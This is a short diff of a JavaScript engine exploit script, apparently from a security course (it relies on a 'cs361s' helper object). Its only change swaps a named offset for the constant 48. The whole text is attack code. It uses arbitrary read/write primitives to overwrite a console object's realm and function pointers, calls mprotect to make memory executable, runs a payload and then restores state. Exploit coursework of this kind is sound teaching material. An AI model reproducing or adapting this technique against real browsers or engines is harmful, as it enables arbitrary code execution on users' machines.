@@ -39,11 +39,11 @@ let mprotect_addr = got_entry - 0x31B00; // std offset from malloc to mprotect
  */
 let target = cs361s.addrof(second_stage);
 let c_func_offset = 56;
-let old_realm = cs361s.readmem(addressconsole + ctx_offset);
-cs361s.writemem(addressconsole + ctx_offset, target); // overwrite realm
+let old_realm = cs361s.readmem(addressconsole + 48);
+cs361s.writemem(addressconsole + 48, target); // overwrite realm
 cs361s.writemem(addressconsole + c_func_offset, mprotect_addr);
 console.log.apply(2.0237e-320, null); // rwx
 // Execute Payload
-cs361s.writemem(addressconsole + ctx_offset, old_realm); // restore realm
+cs361s.writemem(addressconsole + 48, old_realm); // restore realm
 cs361s.writemem(addressconsole + c_func_offset, target + 16); // start of string + 16 HAHAHAHAHHAHAHA
 console.log();
